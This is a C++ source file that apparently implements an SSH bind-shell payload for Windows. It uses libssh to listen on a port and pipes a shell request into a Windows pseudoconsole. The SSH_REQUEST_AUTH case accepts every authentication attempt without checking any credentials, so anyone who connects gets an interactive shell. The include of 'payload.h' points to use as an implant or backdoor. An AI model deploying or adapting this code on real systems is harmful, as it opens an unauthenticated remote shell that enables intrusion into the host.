#include "payload.h"
#include "pseudoconsole.cpp"

class SSHServer {
	ssh_bind bind;
	ssh_session session;
	ssh_event event;
	ssh_channel channel;

	void printInternalErrors();
	void handleShell();

public:
	SSHServer(const char *address, unsigned int port);
	~SSHServer();

	void start();
};

SSHServer::SSHServer(const char *address, unsigned int port) {
	bind = ssh_bind_new();

	auto key = ssh_key_new();
	// auto code = ssh_pki_import_privkey_file("C:/Users/eviira/.ssh/laptop_ed25519.pub", &key);
	// if (code != SSH_OK) {
	// 	std::cerr << "code: " << code << std::endl;
	// 	throw std::runtime_error("generating key");		
	// }
	if (ssh_pki_generate(SSH_KEYTYPE_ECDSA, 256, &key)) {
		throw std::exception("generting key");
	}
	std::cout << "key sucessfully imported" << std::endl;

	ssh_bind_options_set(bind, SSH_BIND_OPTIONS_BINDADDR, address);
	ssh_bind_options_set(bind, SSH_BIND_OPTIONS_BINDPORT, &port);
	// ssh_bind_options_set(bind, SSH_BIND_OPTIONS_HOSTKEY, "/ProgramData/ssh/ssh_host_ed25519_key");
	ssh_bind_options_set(bind, SSH_BIND_OPTIONS_IMPORT_KEY, key);

	session = ssh_new();
}

SSHServer::~SSHServer() {
	if (event != nullptr) {
		ssh_event_free(event);
	}
	if (channel != nullptr) {
		ssh_channel_free(channel);
	}
	if (session != nullptr) {
		ssh_free(session);
	}
	if (bind != nullptr) {
		ssh_bind_free(bind);
	}
}
void SSHServer::printInternalErrors() {
	std::cerr << "!! ssh internal error messages:" << std::endl;
	if (bind != nullptr) {
		std::cout << "- bind: " << ssh_get_error(bind) << std::endl;
	}
	if (session != nullptr) {
		std::cout << "- session: " << ssh_get_error(session) << std::endl;
	}
	if (channel != nullptr) {
		std::cout << "- channel: " << ssh_get_error(channel) << std::endl;
	}
	if (event != nullptr) {
		std::cout << "- event: " << ssh_get_error(event) << std::endl;
	}
}

static int copy_fd_to_chan(socket_t fd, int revents, void *userdata) {
    ssh_channel chan = (ssh_channel)userdata;
    char buf[2048];

    if(!chan) {
		std::cerr << "$ fd closing" << std::endl;
		closesocket(fd);
        // close(fd);
        return -1;
    }
    if(revents & POLLIN) {
		// std::cout << "$ reading fd" << std::endl;
		auto sz = recv(fd, buf, 2048, 0);
        if(sz > 0) {
            ssh_channel_write(chan, buf, sz);
        }
    }
    if(revents & POLLHUP) {
		std::cout << "$ fd->chan closing 2";
        ssh_channel_close(chan);
        return -1;
    }
    return 0;
}

static int copy_chan_to_fd(ssh_session session, ssh_channel channel, void *data, uint32_t len, int is_stderr, void *userdata) {
	int fd = *(int*)userdata;
	int sz;
	(void)session;
	(void)channel;
	(void)is_stderr;

	// std::cout << "$ chan->fd: " << data << std::endl;
	sz = send(fd, (char*)data, len, 0);
	// write(fd, data, len);
	return sz;
}

static void chan_close(ssh_session session, ssh_channel channel, void *userdata) {
    int fd = *(int*)userdata;
    (void)session;
    (void)channel;

	std::cout << "$ chan closing" << std::endl;
	closesocket(fd);
    // close(fd);
}

void SSHServer::handleShell() {
	std::cout << "handling shell!" << std::endl;

	std::cout << "creating event.." << std::endl;
	event = ssh_event_new();
	if (event == NULL) {
		printInternalErrors();
		throw std::runtime_error("creating event");
	}

	std::cout << "creating pseudo-terminal.." << std::endl;
	PTY pty;
	HRESULT result = pty.createPseudoConsole();
	if (FAILED(result)) {
		std::cerr << "create pseudoconsole: " << result << std::endl;
		throw std::exception("creating pseudoconsole");
	}

	pty.createLocalSockets();

	socket_t fd = pty.localClientSocket;

	std::cout << "setting channel callbacks.." << std::endl;
	ssh_channel_callbacks_struct cb = {};
	cb.channel_data_function = copy_chan_to_fd;
	cb.channel_eof_function = chan_close;
	cb.channel_close_function = chan_close;
	cb.userdata = &fd;
	ssh_callbacks_init(&cb);

	if (ssh_set_channel_callbacks(channel, &cb)) {
		printInternalErrors();
		throw std::runtime_error("setting channel callbacks");
	}

	std::cout << "adding fd to event.." << std::endl;
	auto events = POLLIN | POLLPRI | POLLERR | POLLHUP | POLLNVAL;
	if (ssh_event_add_fd(event, fd, events, copy_fd_to_chan, channel) != SSH_OK) {
		// printInternalErrors();
		throw std::runtime_error("adding fd event");
	}

	std::cout << "adding event to session.." << std::endl;
	if (ssh_event_add_session(event, session)) {
		printInternalErrors();
		throw std::runtime_error("adding session to event");
	}

	std::cout << "sitting in event dopoll loop.." << std::endl;
	while (!ssh_channel_is_closed(channel)) {
		auto code = ssh_event_dopoll(event, -1);
		if (code < 0 && errno == 0) {
			break;
		}
		if (code < 0) {
			printInternalErrors();
			std::cout << "code: " << code << std::endl;
			std::cout << "errno: " << errno << std::endl;
			throw std::runtime_error("event poll");
		}
	}
	std::cout << "exited shell.." << std::endl;

	pty.close();
	ssh_event_remove_session(event, session);
	ssh_event_remove_fd(event, fd);
	ssh_remove_channel_callbacks(channel, &cb);
}

void SSHServer::start() {
	std::cout << "listening.." << std::endl;
	if (ssh_bind_listen(bind)) {
		printInternalErrors();
		throw std::runtime_error("start listening");
	}

	std::cout << "waiting connection.." << std::endl;
	if (ssh_bind_accept(bind, session)) {
		printInternalErrors();
		throw std::runtime_error("accepting connection");
	}

	std::cout << "key exchange.." << std::endl;
	if (ssh_handle_key_exchange(session)) {
		printInternalErrors();
		throw std::runtime_error("key exchange");
	}

	while ( true ) {
		std::cout << "waiting next message.." << std::endl;
		ssh_message msg = ssh_message_get(session);
		if (msg == NULL) {
			std::cerr << ssh_get_error(session) << std::endl;
			throw std::runtime_error("getting message");
		}

		auto type = ssh_message_type(msg);
		auto subType = ssh_message_subtype(msg);
		std::cout << "- message type: " << type << std::endl;
		std::cout << "- message sub-type: " << subType << std::endl;

		switch (type) {
			case SSH_REQUEST_SERVICE: {
				auto serviceName = ssh_message_service_service(msg);
				std::cout << "- service name: " << serviceName << std::endl;

				ssh_message_service_reply_success(msg);
				break;
			}
			case SSH_REQUEST_AUTH: {
				ssh_message_auth_reply_success(msg, 0);
				break;
			}
			case SSH_REQUEST_CHANNEL_OPEN: {
				channel = ssh_message_channel_request_open_reply_accept(msg);
				if (channel == NULL) {
					printInternalErrors();
					throw std::runtime_error("opening channel");
				}
 				break;
			}
			case SSH_REQUEST_CHANNEL: {
				ssh_message_channel_request_reply_success(msg);
				if (subType == SSH_CHANNEL_REQUEST_SHELL) {
					handleShell();

					ssh_message_free(msg);
					return;
				}

				break;
			}
		}

		ssh_message_free(msg);
	}
}
